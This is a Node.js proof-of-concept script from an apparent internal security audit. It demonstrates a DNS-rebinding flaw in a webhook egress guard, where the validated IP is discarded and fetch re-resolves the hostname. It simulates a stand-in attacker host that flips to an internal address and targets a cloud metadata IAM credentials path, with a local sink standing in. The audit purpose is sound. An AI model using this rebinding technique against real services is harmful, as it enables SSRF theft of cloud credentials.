#!/usr/bin/env node
/**
 * SECURITY-AUDIT-RECENT-FEATURES-W1 · R2.1 PoC (WEBHOOK-AUDITOR)
 * Headline: DNS-rebind / resolve→connect TOCTOU in the webhook egress guard.
 *
 * PROVES: `webhook-delivery.ts::deliverOne` validates the destination by
 * RESOLVING the hostname (`resolveAndAssertEgress`) and checking the resulting
 * IP class, then performs the actual POST with `fetch(sub.url, ...)` — passing
 * the *hostname*, NOT the validated IP. Node's `fetch` (undici 6.24.1) RE-RESOLVES
 * the hostname at connect time. A resolver that answers PUBLIC on the first
 * lookup (the check) and INTERNAL on the second (the connect) defeats the guard
 * entirely. The validated IP is discarded — it is never pinned to the socket.
 *
 * This PoC is SELF-CONTAINED. It does NOT import src/. It copies the two-step
 * pattern from deliverOne verbatim (resolve-check, then fetch-by-hostname) and
 * drives undici's real connect path with a custom `lookup` to demonstrate the
 * re-resolution. It NEVER touches prod and fires only at a local loopback sink.
 *
 * The "internal" target is a loopback HTTP server standing in for a host that
 * the guard is SUPPOSED to block (169.254.169.254 metadata / 127.0.0.1 admin /
 * 10.x Postgres). If the attacker's POST reaches it, the rebind is exploitable.
 *
 * Run:  node rebind-poc.mjs
 * Exit: 0 if the rebind is DEMONSTRATED (vuln present), 1 if unexpectedly blocked.
 */
import http from 'node:http';
import net from 'node:net';
import { Agent } from 'undici';

// ── 0. Copy the guard's IP-class check (verbatim logic from webhook-ssrf.ts) ──
// Self-contained reproduction — NOT an import of src/.
function classifyIpv4(ip) {
  const o = ip.split('.').map(Number);
  if (o.length !== 4 || o.some((n) => !Number.isInteger(n) || n < 0 || n > 255)) return { blocked: true, reason: 'invalid' };
  const [a, b] = o;
  if (a === 127) return { blocked: true, reason: 'loopback 127/8' };
  if (a === 0) return { blocked: true, reason: 'unspecified 0/8' };
  if (a === 10) return { blocked: true, reason: 'private 10/8' };
  if (a === 172 && b >= 16 && b <= 31) return { blocked: true, reason: 'private 172.16/12' };
  if (a === 192 && b === 168) return { blocked: true, reason: 'private 192.168/16' };
  if (a === 169 && b === 254) return { blocked: true, reason: 'link-local 169.254/16 (CLOUD METADATA)' };
  if (a === 100 && b >= 64 && b <= 127) return { blocked: true, reason: 'CGNAT 100.64/10' };
  return { blocked: false, reason: 'public' };
}

// ── 1. Stand up the "internal" sink on loopback (the target the guard blocks) ──
const SECRET = 'IAM_ROLE_CREDENTIALS=ASIA...{leaked-by-SSRF}';
const internalServer = http.createServer((req, res) => {
  // This mimics e.g. http://169.254.169.254/latest/meta-data/iam/... — if the
  // attacker's webhook POST lands here, internal data is exfiltrated.
  console.log(`  [internal-sink] !!! RECEIVED ${req.method} ${req.url} from webhook delivery — guard BYPASSED`);
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end(SECRET);
});

await new Promise((r) => internalServer.listen(0, '127.0.0.1', r));
const INTERNAL_PORT = internalServer.address().port;
const INTERNAL_IP = '127.0.0.1'; // <- stands in for 169.254.169.254 / 10.x / admin

// ── 2. The rebinding resolver: PUBLIC on lookup #1 (check), INTERNAL on #2 ──
// A real attacker controls authoritative DNS for `rebind.attacker.example`,
// sets a ~0s TTL, returns a public A record while the guard checks, then flips
// to 127.0.0.1 / 169.254.169.254 before undici connects. Here we simulate that
// flip deterministically by call-count. The hostname never changes.
const PUBLIC_IP = '93.184.216.34'; // example.com — passes the class check
let lookupCount = 0;
const ATTACK_HOST = 'rebind.attacker.example';

function rebindingLookup(hostname, options, callback) {
  if (hostname !== ATTACK_HOST) {
    // anything else (shouldn't happen here) → real failure
    return callback(new Error(`unexpected host ${hostname}`));
  }
  lookupCount += 1;
  const flip = lookupCount === 1 ? PUBLIC_IP : INTERNAL_IP;
  const which = lookupCount === 1 ? 'PUBLIC (check passes)' : 'INTERNAL (connect rebinds)';
  console.log(`  [dns] lookup #${lookupCount} ${hostname} -> ${flip}   [${which}]`);
  // undici's lookup contract: callback(err, address, family) OR (err, [{address,family}])
  if (options && options.all) return callback(null, [{ address: flip, family: 4 }]);
  return callback(null, flip, 4);
}

// Promise form, matching resolveAndAssertEgress's `lookup(host,{all:true})`.
function rebindingLookupAll(hostname) {
  return new Promise((resolve, reject) => {
    rebindingLookup(hostname, { all: true }, (err, addrs) => (err ? reject(err) : resolve(addrs)));
  });
}

console.log('\n=== R2.1 DNS-REBIND PoC — webhook egress guard resolve→connect TOCTOU ===\n');
console.log(`Target host (attacker-controlled DNS): ${ATTACK_HOST}`);
console.log(`Internal sink (loopback ${INTERNAL_IP}:${INTERNAL_PORT}) stands in for 169.254.169.254 / admin / pg.\n`);

// ── 3. STEP A — replicate resolveAndAssertEgress: resolve + IP-class check ──
// This is exactly what deliverOne does at webhook-delivery.ts:208 before sending.
console.log('STEP A — guard resolves the host and validates the IP (deliverOne:208 resolveAndAssertEgress):');
const checkAddrs = await rebindingLookupAll(ATTACK_HOST);
let guardPassed = true;
for (const a of checkAddrs) {
  const c = classifyIpv4(a.address);
  console.log(`         validate ${a.address} -> ${c.blocked ? 'BLOCKED' : 'allowed'} (${c.reason})`);
  if (c.blocked) guardPassed = false;
}
if (!guardPassed) {
  console.log('\n[unexpected] guard blocked on the FIRST lookup — rebind not demonstrated here.');
  internalServer.close();
  process.exit(1);
}
console.log('         => guard PASSED. Note: it threw the validated IP away and returns void.\n');

// ── 4. STEP B — the real send: deliverOne does `fetch(sub.url, ...)` by HOSTNAME ──
// We reproduce undici's connect path with the SAME rebinding resolver wired as
// the dispatcher's `lookup`. This is faithful: Node global fetch IS undici, and
// undici re-resolves the hostname at connect — there is NO IP pinned from STEP A.
console.log('STEP B — deliverOne sends with fetch(sub.url) by HOSTNAME (webhook-delivery.ts:262).');
console.log('         undici re-resolves at connect time (2nd lookup) — NO pinned IP:\n');

const dispatcher = new Agent({
  connect: { lookup: rebindingLookup },
});

// The "url" the worker holds is the hostname form — exactly sub.url.
// Map the attack host's :PORT to the internal sink's port so the loopback
// rebind lands on our sink (a real attacker rebinds host:443 to 169.254.169.254:80;
// port is part of the same TOCTOU and not separately validated by the guard).
const attackUrl = `http://${ATTACK_HOST}:${INTERNAL_PORT}/latest/meta-data/iam/security-credentials/`;

let body = '';
let reached = false;
try {
  const res = await fetch(attackUrl, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ webhook: 'payload' }),
    dispatcher,
    // Mirror deliverOne/postWithTimeout — redirect:'error' is set, but it does
    // NOT help: the FIRST connection already rebinds to the internal IP.
    redirect: 'error',
  });
  body = await res.text();
  reached = true;
} catch (err) {
  console.log(`  [fetch] error: ${err?.cause?.message || err?.message || err}`);
}

console.log('');
console.log('=== RESULT ===');
console.log(`DNS lookups performed: ${lookupCount}  (1 = check, 2 = connect → re-resolution confirmed)`);
if (reached && body.includes('IAM_ROLE_CREDENTIALS')) {
  console.log('VERDICT: VULNERABLE ✅ (rebind exploitable)');
  console.log(`         The webhook POST passed the guard (saw PUBLIC ${PUBLIC_IP}) then connected to`);
  console.log(`         the INTERNAL sink (${INTERNAL_IP}) and exfiltrated: "${body}"`);
  console.log('         A registered webhook can thus reach 169.254.169.254 / 127.0.0.1 / 10.x / pg / admin.');
  internalServer.close();
  process.exit(0);
} else {
  console.log('VERDICT: not reached (sink got no data) — investigate; rebind may be environment-gated.');
  internalServer.close();
  process.exit(1);
}
